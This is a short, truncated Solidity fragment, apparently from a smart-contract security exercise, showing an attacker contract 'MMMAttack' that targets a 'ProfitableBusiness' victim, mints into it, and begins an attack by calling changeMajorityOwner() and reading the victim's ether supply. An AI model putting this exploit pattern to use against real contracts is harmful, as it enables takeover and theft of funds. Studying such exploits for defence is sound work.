...
contract MMMAttack {
    ...
    function setVictim(address victim) external {
        mmm = ProfitableBusiness(victim);
    }

    function mint() external payable {
        mmm.mint{value:msg.value}();
    }

    function attack() external{
        mmm.changeMajorityOwner();
        uint256 amount = mmm.ethTotalSupply();
